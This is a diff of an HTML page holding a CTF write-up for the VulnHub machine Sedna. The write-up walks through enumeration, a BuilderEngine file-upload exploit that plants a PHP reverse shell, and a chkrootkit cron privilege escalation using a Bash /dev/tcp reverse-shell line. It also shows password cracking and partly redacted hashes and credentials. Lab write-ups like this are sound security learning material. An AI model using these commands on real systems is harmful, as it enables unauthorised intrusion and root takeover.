@@ -31,19 +31,19 @@
       </table>
     </div>
     <div class="body">
-          <h1>[VulnHub] hackfest2016: Sedna</h1>
+          <h1 class="h1 collapsible" onclick="toggle(this);">[VulnHub] hackfest2016: Sedna</h1>
                   <p><a href="/posts/20190918_vulnhub-quaoar.html"> « </a>📅 published on <code>19/Sep/2019</code><a href="/posts/20190920_vulnhub-vulnix.html"> » </a></p>
-                <h2>Overview</h2>
-<p>This is a writeup for VulnHub VM <a href="https://www.vulnhub.com/entry/hackfest2016-sedna,181/">hackfest2016: Sedna</a>. Here are stats for this machine from <a href="https://github.com/7h3rAm/machinescli">machinescli</a>:</p>
-<p><img alt="writeup.overview.machinescli" src="/static/files/posts_vulnhub_sedna/machinescli.png.webp" /></p>
-<h3>Killchain</h3>
-<p>Here's the killchain (<code>enumeration</code> → <code>exploitation</code> → <code>privilege escalation</code>) for this machine:</p>
-<p><img alt="writeup.overview.killchain" src="/static/files/posts_vulnhub_sedna/killchain.png.webp" /></p>
-<h3>TTPs</h3>
-<p>1. <code>80/tcp/http/Apache httpd 2.4.7 ((Ubuntu))</code>: <a href="https://github.com/7h3rAm/writeups#exploit_php_fileupload">exploit_php_fileupload</a>, <a href="https://github.com/7h3rAm/writeups#exploit_php_reverseshell">exploit_php_reverseshell</a>, <a href="https://github.com/7h3rAm/writeups#privesc_chkrootkit">privesc_chkrootkit</a>, <a href="https://github.com/7h3rAm/writeups#privesc_cron">privesc_cron</a>, <a href="https://github.com/7h3rAm/writeups#privesc_bash_reverseshell">privesc_bash_reverseshell</a>  </p>
-<h2>Phase #1: Enumeration</h2>
-<p>1. Here's the Nmap scan result:  </p>
-<pre><code># Nmap 7.70 scan initiated Wed Sep 18 18:02:06 2019 as: nmap -vv --reason -Pn -sV -sC --version-all -oN /root/toolbox/writeups/vulnhub.sedna/results/192.168.92.176/scans/_quick_tcp_nmap.txt -oX /root/toolbox/writeups/vulnhub.sedna/results/192.168.92.176/scans/xml/_quick_tcp_nmap.xml 192.168.92.176
+                <h2 class="h2 collapsible" onclick="toggle(this);">Overview</h2>
+<p class="nested">This is a writeup for VulnHub VM <a href="https://www.vulnhub.com/entry/hackfest2016-sedna,181/">hackfest2016: Sedna</a>. Here are stats for this machine from <a href="https://github.com/7h3rAm/machinescli">machinescli</a>:</p>
+<p class="nested"><img alt="writeup.overview.machinescli" src="/static/files/posts_vulnhub_sedna/machinescli.png.webp" /></p>
+<h3 class="h3 collapsible" onclick="toggle(this);">Killchain</h3>
+<p class="nested">Here's the killchain (<code>enumeration</code> → <code>exploitation</code> → <code>privilege escalation</code>) for this machine:</p>
+<p class="nested"><img alt="writeup.overview.killchain" src="/static/files/posts_vulnhub_sedna/killchain.png.webp" /></p>
+<h3 class="h3 collapsible" onclick="toggle(this);">TTPs</h3>
+<p class="nested">1. <code>80/tcp/http/Apache httpd 2.4.7 ((Ubuntu))</code>: <a href="https://github.com/7h3rAm/writeups#exploit_php_fileupload">exploit_php_fileupload</a>, <a href="https://github.com/7h3rAm/writeups#exploit_php_reverseshell">exploit_php_reverseshell</a>, <a href="https://github.com/7h3rAm/writeups#privesc_chkrootkit">privesc_chkrootkit</a>, <a href="https://github.com/7h3rAm/writeups#privesc_cron">privesc_cron</a>, <a href="https://github.com/7h3rAm/writeups#privesc_bash_reverseshell">privesc_bash_reverseshell</a>  </p>
+<h2 class="h2 collapsible" onclick="toggle(this);">Phase #1: Enumeration</h2>
+<p class="nested">1. Here's the Nmap scan result:  </p>
+<pre class="nested"><code># Nmap 7.70 scan initiated Wed Sep 18 18:02:06 2019 as: nmap -vv --reason -Pn -sV -sC --version-all -oN /root/toolbox/writeups/vulnhub.sedna/results/192.168.92.176/scans/_quick_tcp_nmap.txt -oX /root/toolbox/writeups/vulnhub.sedna/results/192.168.92.176/scans/xml/_quick_tcp_nmap.xml 192.168.92.176
 Nmap scan report for 192.168.92.176
 Host is up, received arp-response (0.0036s latency).
 Scanned at 2019-09-18 18:02:07 PDT for 27s
@@ -268,10 +268,10 @@ Read data files from: /usr/bin/../share/nmap
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 # Nmap done at Wed Sep 18 18:02:34 2019 -- 1 IP address (1 host up) scanned in 27.71 seconds
 </code></pre>
-<p>2. Here a summary of open ports and associated <a href="https://github.com/Tib3rius/AutoRecon">AutoRecon</a> scan files:</p>
-<p><img alt="writeup.enumeration.steps.2.1" src="/static/files/posts_vulnhub_sedna/openports.png.webp" />  </p>
-<p>3. From the Nikto scan report we see that there is a <code>license.txt</code> file that could be interesting. We take a look at the file and find <code>Copyright (c) 2012 - 2015 BuilderEngine / Radian Enterprise Systems Limited.</code> message in it indicating installation of <code>BuilderEngine</code> application:  </p>
-<pre><code>- Nikto v2.1.6
+<p class="nested">2. Here a summary of open ports and associated <a href="https://github.com/Tib3rius/AutoRecon">AutoRecon</a> scan files:</p>
+<p class="nested"><img alt="writeup.enumeration.steps.2.1" src="/static/files/posts_vulnhub_sedna/openports.png.webp" />  </p>
+<p class="nested">3. From the Nikto scan report we see that there is a <code>license.txt</code> file that could be interesting. We take a look at the file and find <code>Copyright (c) 2012 - 2015 BuilderEngine / Radian Enterprise Systems Limited.</code> message in it indicating installation of <code>BuilderEngine</code> application:  </p>
+<pre class="nested"><code>- Nikto v2.1.6
 ---------------------------------------------------------------------------
 + Target IP:          192.168.92.176
 + Target Hostname:    192.168.92.176
@@ -297,9 +297,9 @@ Service detection performed. Please report any incorrect results at https://nmap
 ---------------------------------------------------------------------------
 + 1 host(s) tested
 </code></pre>
-<h3>Findings</h3>
-<h4>Open Ports</h4>
-<pre><code>22/tcp     |  ssh          |  OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
+<h3 class="h3 collapsible" onclick="toggle(this);">Findings</h3>
+<h4 class="h4 collapsible" onclick="toggle(this);">Open Ports</h4>
+<pre class="nested"><code>22/tcp     |  ssh          |  OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
 53/tcp     |  domain       |  ISC BIND 9.9.5-3 (Ubuntu Linux)
 80/tcp     |  http         |  Apache httpd 2.4.7 ((Ubuntu))
 110/tcp    |  pop3         |  Dovecot pop3d
@@ -313,24 +313,24 @@ Service detection performed. Please report any incorrect results at https://nmap
 8080/tcp   |  http         |  Apache Tomcat/Coyote JSP engine 1.1
 40176/tcp  |  status       |  1 (RPC #100024)
 </code></pre>
-<h4>Files</h4>
-<pre><code>http://192.168.92.176/license.txt
+<h4 class="h4 collapsible" onclick="toggle(this);">Files</h4>
+<pre class="nested"><code>http://192.168.92.176/license.txt
 </code></pre>
-<h2>Phase #2: Exploitation</h2>
-<p>1. There's an arbitrary file upload <a href="https://www.exploit-db.com/exploits/40390">exploit</a> for <code>BuilderEngine</code> that we can use:  </p>
-<pre><code>searchsploit builderengine
+<h2 class="h2 collapsible" onclick="toggle(this);">Phase #2: Exploitation</h2>
+<p class="nested">1. There's an arbitrary file upload <a href="https://www.exploit-db.com/exploits/40390">exploit</a> for <code>BuilderEngine</code> that we can use:  </p>
+<pre class="nested"><code>searchsploit builderengine
 </code></pre>
-<p><img alt="writeup.exploitation.steps.1.1" src="/static/files/posts_vulnhub_sedna/screenshot02a.png.webp" />  </p>
-<p>2. The exploit needs an update to point to the right <code>BuilderEngine</code> url and then it can be used to <code>POST</code> a local file to the target server. We use this exploit to upload a PHP reverse shell, note the location of uploaded file, start a local <code>netcat</code> listener and trigger file execution to catch incoming reverse shell:  </p>
-<pre><code>http://192.168.92.176/themes/dashboard/assets/plugins/jquery-file-upload/server/php/
+<p class="nested"><img alt="writeup.exploitation.steps.1.1" src="/static/files/posts_vulnhub_sedna/screenshot02a.png.webp" />  </p>
+<p class="nested">2. The exploit needs an update to point to the right <code>BuilderEngine</code> url and then it can be used to <code>POST</code> a local file to the target server. We use this exploit to upload a PHP reverse shell, note the location of uploaded file, start a local <code>netcat</code> listener and trigger file execution to catch incoming reverse shell:  </p>
+<pre class="nested"><code>http://192.168.92.176/themes/dashboard/assets/plugins/jquery-file-upload/server/php/
 nc -nlvp 9999
 http://192.168.92.176/files/php-reverse-shell.php
 </code></pre>
-<p><img alt="writeup.exploitation.steps.2.1" src="/static/files/posts_vulnhub_sedna/screenshot01.png.webp" />  </p>
-<p><img alt="writeup.exploitation.steps.2.2" src="/static/files/posts_vulnhub_sedna/screenshot03.png.webp" />  </p>
-<p><img alt="writeup.exploitation.steps.2.3" src="/static/files/posts_vulnhub_sedna/screenshot04.png.webp" />  </p>
-<h2>Phase #2.5: Post Exploitation</h2>
-<pre><code>www-data@Sedna&gt; id
+<p class="nested"><img alt="writeup.exploitation.steps.2.1" src="/static/files/posts_vulnhub_sedna/screenshot01.png.webp" />  </p>
+<p class="nested"><img alt="writeup.exploitation.steps.2.2" src="/static/files/posts_vulnhub_sedna/screenshot03.png.webp" />  </p>
+<p class="nested"><img alt="writeup.exploitation.steps.2.3" src="/static/files/posts_vulnhub_sedna/screenshot04.png.webp" />  </p>
+<h2 class="h2 collapsible" onclick="toggle(this);">Phase #2.5: Post Exploitation</h2>
+<pre class="nested"><code>www-data@Sedna&gt; id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 www-data@Sedna&gt;  
 www-data@Sedna&gt; uname
@@ -350,63 +350,63 @@ www-data@Sedna&gt;
 www-data@Sedna&gt; users
 crackmeforpoints
 </code></pre>
-<h2>Phase #3: Privilege Escalation</h2>
-<p>1. While exploring <code>/var/www</code> directory we find the first flag:  </p>
-<pre><code>cat /var/www/flag.txt
+<h2 class="h2 collapsible" onclick="toggle(this);">Phase #3: Privilege Escalation</h2>
+<p class="nested">1. While exploring <code>/var/www</code> directory we find the first flag:  </p>
+<pre class="nested"><code>cat /var/www/flag.txt
 </code></pre>
-<p><img alt="writeup.privesc.steps.1.1" src="/static/files/posts_vulnhub_sedna/screenshot05.png.webp" />  </p>
-<p>2. We look for presence of <code>chkrootkit</code> shell script and find at <code>/etc/chkrootkit/chkrootkit</code>:  </p>
-<pre><code>find / -type f -name chkrootkit 2&gt;/dev/null
+<p class="nested"><img alt="writeup.privesc.steps.1.1" src="/static/files/posts_vulnhub_sedna/screenshot05.png.webp" />  </p>
+<p class="nested">2. We look for presence of <code>chkrootkit</code> shell script and find at <code>/etc/chkrootkit/chkrootkit</code>:  </p>
+<pre class="nested"><code>find / -type f -name chkrootkit 2&gt;/dev/null
 file /etc/chkrootkit/chkrootkit
 </code></pre>
-<p><img alt="writeup.privesc.steps.2.1" src="/static/files/posts_vulnhub_sedna/screenshot05a.png.webp" />  </p>
-<p>3. We find a local privilege escalation exploit for <code>chkrootkit</code> using <code>searchsploit</code> and look at steps to use this:  </p>
-<pre><code>searchsploit chkrootkit
+<p class="nested"><img alt="writeup.privesc.steps.2.1" src="/static/files/posts_vulnhub_sedna/screenshot05a.png.webp" />  </p>
+<p class="nested">3. We find a local privilege escalation exploit for <code>chkrootkit</code> using <code>searchsploit</code> and look at steps to use this:  </p>
+<pre class="nested"><code>searchsploit chkrootkit
 searchsploit -x 33899
 </code></pre>
-<p><img alt="writeup.privesc.steps.3.1" src="/static/files/posts_vulnhub_sedna/screenshot05b.png.webp" />  </p>
-<p><img alt="writeup.privesc.steps.3.2" src="/static/files/posts_vulnhub_sedna/screenshot05c.png.webp" />  </p>
-<p>4. For the exploit to work, we create a <code>/tmp/update</code> file, assign executable permissions to it and add a Bash reverse shell command to it:  </p>
-<pre><code>touch /tmp/update
+<p class="nested"><img alt="writeup.privesc.steps.3.1" src="/static/files/posts_vulnhub_sedna/screenshot05b.png.webp" />  </p>
+<p class="nested"><img alt="writeup.privesc.steps.3.2" src="/static/files/posts_vulnhub_sedna/screenshot05c.png.webp" />  </p>
+<p class="nested">4. For the exploit to work, we create a <code>/tmp/update</code> file, assign executable permissions to it and add a Bash reverse shell command to it:  </p>
+<pre class="nested"><code>touch /tmp/update
 chmod +x /tmp/update
 printf &quot;bash -i &gt;&amp; /dev/tcp/192.168.92.163/443 0&gt;&amp;1 \n&quot; &gt;/tmp/update
 cat /tmp/update
   bash -i &gt;&amp; /dev/tcp/192.168.92.163/443 0&gt;&amp;1
 </code></pre>
-<p><img alt="writeup.privesc.steps.4.1" src="/static/files/posts_vulnhub_sedna/screenshot05d.png.webp" />  </p>
-<p>5. Once <code>chkrootkit</code> shell script excutes via <code>cronjob</code>, it will also run <code>/tmp/update</code> file with <code>root</code> privileges giving us an elevated shell:  </p>
-<pre><code>nc -nlvp 443
+<p class="nested"><img alt="writeup.privesc.steps.4.1" src="/static/files/posts_vulnhub_sedna/screenshot05d.png.webp" />  </p>
+<p class="nested">5. Once <code>chkrootkit</code> shell script excutes via <code>cronjob</code>, it will also run <code>/tmp/update</code> file with <code>root</code> privileges giving us an elevated shell:  </p>
+<pre class="nested"><code>nc -nlvp 443
 </code></pre>
-<p><img alt="writeup.privesc.steps.5.1" src="/static/files/posts_vulnhub_sedna/screenshot06.png.webp" />  </p>
-<p>6. We then get the second flag at <code>/root/flag.txt</code>:  </p>
-<pre><code>cat /root/flag.txt
+<p class="nested"><img alt="writeup.privesc.steps.5.1" src="/static/files/posts_vulnhub_sedna/screenshot06.png.webp" />  </p>
+<p class="nested">6. We then get the second flag at <code>/root/flag.txt</code>:  </p>
+<pre class="nested"><code>cat /root/flag.txt
 </code></pre>
-<p><img alt="writeup.privesc.steps.6.1" src="/static/files/posts_vulnhub_sedna/screenshot07.png.webp" />  </p>
-<p>7. While exploring <code>/etc/tomcat7</code> directory we come across third flag:  </p>
-<pre><code>cat /etc/tomcat7/tomcat-users.xml
+<p class="nested"><img alt="writeup.privesc.steps.6.1" src="/static/files/posts_vulnhub_sedna/screenshot07.png.webp" />  </p>
+<p class="nested">7. While exploring <code>/etc/tomcat7</code> directory we come across third flag:  </p>
+<pre class="nested"><code>cat /etc/tomcat7/tomcat-users.xml
 </code></pre>
-<p><img alt="writeup.privesc.steps.7.1" src="/static/files/posts_vulnhub_sedna/screenshot08.png.webp" />  </p>
-<p>8. To obtain fourth and final flag, we need to crack hash for user <code>crackmeforpoints</code>. We created a wordlist from <code>https://en.wikipedia.org/wiki/90377_Sedna</code> and tried bruteforcing but it failed. We then tried bruteforcing using the <code>rockyou.txt</code> wordlist but it didn't complete on time:  </p>
-<pre><code>cewl -m 4 -w dict.txt &quot;https://en.wikipedia.org/wiki/90377_Sedna&quot;
+<p class="nested"><img alt="writeup.privesc.steps.7.1" src="/static/files/posts_vulnhub_sedna/screenshot08.png.webp" />  </p>
+<p class="nested">8. To obtain fourth and final flag, we need to crack hash for user <code>crackmeforpoints</code>. We created a wordlist from <code>https://en.wikipedia.org/wiki/90377_Sedna</code> and tried bruteforcing but it failed. We then tried bruteforcing using the <code>rockyou.txt</code> wordlist but it didn't complete on time:  </p>
+<pre class="nested"><code>cewl -m 4 -w dict.txt &quot;https://en.wikipedia.org/wiki/90377_Sedna&quot;
 unshadow passwd shadow &gt;unshadowed ; john --rules --wordlist=./dict.txt unshadowed
 john --rules --wordlist=/usr/share/wordlists/rockyou.txt unshadowed
 </code></pre>
-<p><img alt="writeup.privesc.steps.8.1" src="/static/files/posts_vulnhub_sedna/screenshot09.png.webp" />  </p>
-<p><img alt="writeup.privesc.steps.8.2" src="/static/files/posts_vulnhub_sedna/screenshot10.png.webp" />  </p>
-<h2>Loot</h2>
-<h3>Hashes</h3>
-<pre><code>root:$6$sZyJlUny$OcHP9bd8dO9rAKAlryxUjnUbH0dxgZc2uCePZMUUKSeIdALUulXLQ1iDjoEQpvZI.HTHOHUkCR.m39Xrt........................
+<p class="nested"><img alt="writeup.privesc.steps.8.1" src="/static/files/posts_vulnhub_sedna/screenshot09.png.webp" />  </p>
+<p class="nested"><img alt="writeup.privesc.steps.8.2" src="/static/files/posts_vulnhub_sedna/screenshot10.png.webp" />  </p>
+<h2 class="h2 collapsible" onclick="toggle(this);">Loot</h2>
+<h3 class="h3 collapsible" onclick="toggle(this);">Hashes</h3>
+<pre class="nested"><code>root:$6$sZyJlUny$OcHP9bd8dO9rAKAlryxUjnUbH0dxgZc2uCePZMUUKSeIdALUulXLQ1iDjoEQpvZI.HTHOHUkCR.m39Xrt........................
 crackmeforpoints:$6$p22wX4fD$RRAamkeGIA56pj4MpM7CbrKPhShVkZnNH2NjZ8JMUP6Y/1upG.54kSph/HSP1LFcn4.2C11cF0R7Qmo..........................
 </code></pre>
-<h3>Credentials</h3>
-<pre><code>tomcat: tomcat/submitthisforp.....
+<h3 class="h3 collapsible" onclick="toggle(this);">Credentials</h3>
+<pre class="nested"><code>tomcat: tomcat/submitthisforp.....
 </code></pre>
-<h3>Flags</h3>
-<pre><code>bfbb7e6e6e88d9ae66848b9ae.......
+<h3 class="h3 collapsible" onclick="toggle(this);">Flags</h3>
+<pre class="nested"><code>bfbb7e6e6e88d9ae66848b9ae.......
 a10828bee17db751de4b93661.......
 </code></pre>
-<h2>References</h2>
-<ul>
+<h2 class="h2 collapsible" onclick="toggle(this);">References</h2>
+<ul class="nested">
 <li><a href="https://www.vulnhub.com/entry/hackfest2016-sedna,181/">https://www.vulnhub.com/entry/hackfest2016-sedna,181/</a>  </li>
 <li><a href="https://www.n00py.io/2017/03/vulnhub-walkthrough-hackfest2016-sedna/">https://www.n00py.io/2017/03/vulnhub-walkthrough-hackfest2016-sedna/</a>  </li>
 </ul>
@@ -415,19 +415,12 @@ a10828bee17db751de4b93661.......
             </div>
     <div class="footer footercenter">
       <span>
-        <a href=https://creativecommons.org/licenses/by-sa/4.0/ class=footspan>  </a>
+        <a href="https://github.com/7h3rAm/7h3rAm.github.io" class="footspan">  </a>
       </span>
     </div>
     <script>hljs.initHighlightingOnLoad();</script>
     <script>hljs.initLineNumbersOnLoad();</script>
-    <script>
-      function toggle(s){
-        s.classList.toggle("expanded");
-        for(var l=s.nextElementSibling;l;){
-          l.classList.contains("collapsible")&&l.classList.toggle("expanded"),l.classList.toggle("active"),l=l.nextElementSibling
-        }
-      }
-    </script>
+    <script>function toggle(s){s.classList.toggle("expanded");var t=!1,i=!1,a=!1;s.classList.contains("h2")&&(t=!0),s.classList.contains("h3")&&(i=!0),s.classList.contains("h4")&&(a=!0),console.log(s),console.log(t),console.log(i),console.log(a);for(var l=s.nextElementSibling;l;){if(t&&l.classList.contains("h2")){l.classList.toggle("active");break}if(i&&(l.classList.contains("h2")||l.classList.contains("h3"))){l.classList.toggle("active");break}if(a&&(l.classList.contains("h2")||l.classList.contains("h3")||l.classList.contains("h4"))){l.classList.toggle("active");break}l.classList.contains("collapsible")&&l.classList.toggle("expanded"),l.classList.toggle("active"),l=l.nextElementSibling}}</script>
     <script data-goatcounter=https://manthan.goatcounter.com/count async src=//gc.zgo.at/count.js></script>
   </body>
 </html>
